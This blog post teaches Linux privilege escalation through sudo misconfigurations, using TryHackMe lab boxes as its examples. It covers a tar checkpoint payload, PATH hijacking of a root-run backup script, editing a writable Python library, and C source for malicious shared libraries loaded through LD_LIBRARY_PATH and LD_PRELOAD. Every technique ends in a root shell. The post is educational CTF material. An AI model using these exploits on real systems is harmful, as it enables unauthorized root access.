---
layout: post
title: Privilege escalation - abusing sudo
author: wizarddos
category: offensive
excerpt_separator: <!--more-->
---

Hi there - first time posting here

While managing linux-based servers, some commands need to be run as root.
However giving full root privileges to an account might be dangerous. Why should `www-data` user be able to run `/bin/bash` as root?

In addition, if a malicious actor accesses the machine using `sudo`, it gives them new privilege escalation vector.

```sh
$ sudo -l
[sudo] password for rick:
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,
    env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```
(it comes from a TryHackMe box called `Hijack`)
{: class="subtext" } 

And that's our focus today. As a hacker we'll be learning new ways to elevate our privileges in a system
<!--more-->


## Case study

We're gonna obtain a root shell in 3 different scenarios

1. Using typical binary
2. Via user-created script
3. Utilizing dynamic libraries


### Case 1 - Typical binary

Imagine this: 

After succesfully exploiting RCE on a website, we gain user access. Now it's time to escalate

We're checking what can be run as `root`
```sh
$ sudo -l

Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
(Source: [Bounty Hacker box](https://tryhackme.com/r/room/cowboyhacker))
{: class="subtext" }

There is one such binary, **but how can we use it?**

There is a website called [GTFOBins](https://gtfobins.github.io/) - it has lots of payloads, ready to utilize. 

It doesn't matter if it's `sudo`, `SUID bit` set, or linux capabilities - it has it all

After searching for `tar` and choosing the `SUDO` option, we find this payload
```sh
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
Executing payload gives us root

Now, time to jump to the next case

### Case 2 - Scripts

Running with `sudo` is not only limited to compiled binaries. We can run certain scripts as well
```sh
$ sudo -l

Matching Defaults entries for user on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User user may run the following commands on debian:
    (root) /home/user/backup.sh
```

Our script will create backup from `/home/user` and place it in `/var/backups`
```sh
#!/bin/bash

source_dir="/home/user"
backup_dir="/var/backups"

if [ ! -d "$source_dir" ]; then
    exit 1
fi

mkdir -p "$backup_dir"

timestamp=$(date +"%Y%m%d_%H%M%S")
backup_filename="user_home_backup_$timestamp.tar.gz"

tar -czf "$backup_dir/$backup_filename" -C "$(dirname "$source_dir")" "$(basename "$source_dir")"

if [ $? -ne 0 ]; then
    exit 1
fi
```

As you can see, we use `tar` here. But how is it exploitable? 

As it uses **relative path** - what does it mean?

When script is executed and it uses a binary, system needs to find it first

So it searches:
1. For such in current direcory
2. If nothing was found, then it looks through all directories in `PATH` variable - from left to right

In `/home/user` create a new file called `tar` with `/bin/bash` in it. Then we have root
```sh
$ pwd
/home/user

$ echo "/bin/bash" > tar
$ sudo /home/user/backup.sh 

#
```

That's how we hijacked a binary. Simmilarly we can modify python libraries.

The file with the code is called `restore.py`
```py
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```
(taken from [Dreaming on tryhackme](https://tryhackme.com/r/room/dreaming))
{: class="subtext" }

As we see, it uses `shutil` to copy files - time to find that library
```sh
$ find / -name shutil*  2>>/dev/null
/usr/lib/python3.8/shutil.py
[...]
```
It's permissions allow us to edit it - so we can add python shell (For example from [revshells.com](https://revshells.com/))

Last but not least!

### Case 3 - abusing dynamic libraries

There are actually two types in here - yet both are really similar

We'll be using dynamic libraries to execute our code.

#### `LD_LIBRARY_PATH`

```sh
$ sudo -l
[sudo] password for rick:
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,
    env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```
(Comes from [Hijack box on TryHackme](https://tryhackme.com/r/room/hijack))
{: class="subtext" }

As we see `sudo -l` returned this line
```
env_keep+=LD_LIBRARY_PATH
```

`LD_LIBRARY_PATH` contains list of directories which search for shared libraries first

To exploit it, we need to find a library to overwrite.
```sh
$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007ffd7cb32000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fe1c7227000)
        libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0 (0x00007fe1c7000000)
        libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0 (0x00007fe1c6dce000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fe1c6bb1000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe1c67e7000)
        libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007fe1c65af000)
        libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007fe1c6386000)
        libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007fe1c6181000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe1c5f7d000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fe1c773c000)
```

I'm gonna use `libcrypt.so.1` - in `/tmp` create a file called `malicious.c`
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Then, we need to compile it into a shared library with that name, not like a typical C code.
```sh
$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/malicious.c
```

Then we have to execute that specific command, but while setting `LD_LIBRARY_PATH` to our malicious library location
```sh
$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2

#
```

And boom! We have root

#### `LD_PRELOAD`

`LD_LIBRARY_PATH` is not the only dangerous `env_keep` option

There's another one as well
```sh
$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping
```
(Source: [Creative box, THM](https://tryhackme.com/r/room/creative))
{: class="subtext" }

`LD_PRELOAD` specifies what shared libraries are used in execution 

Let's create a file called lib.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setuid(0);
	setgid(0);
	system("/bin/bash -p");
}
```

Compile it as a shared library as well - remember about the name.
```sh
$ gcc -fPIC -shared -nostartfiles -o lib.o lib.c
```

And now it's time to run that ping command.
```sh
$ sudo LD_PRELOAD=/home/saad/lib.o /usr/bin/ping 127.0.0.1

#
```

We have root as well.

## Conclusion

That's it. I hope you've learned something new

How do you like this new blog by the way? Do you have some suggestions for UI?

Anyways, thanks for reading - visit [main blog]("https://wizarddos.github.io/blog") as well and see you next time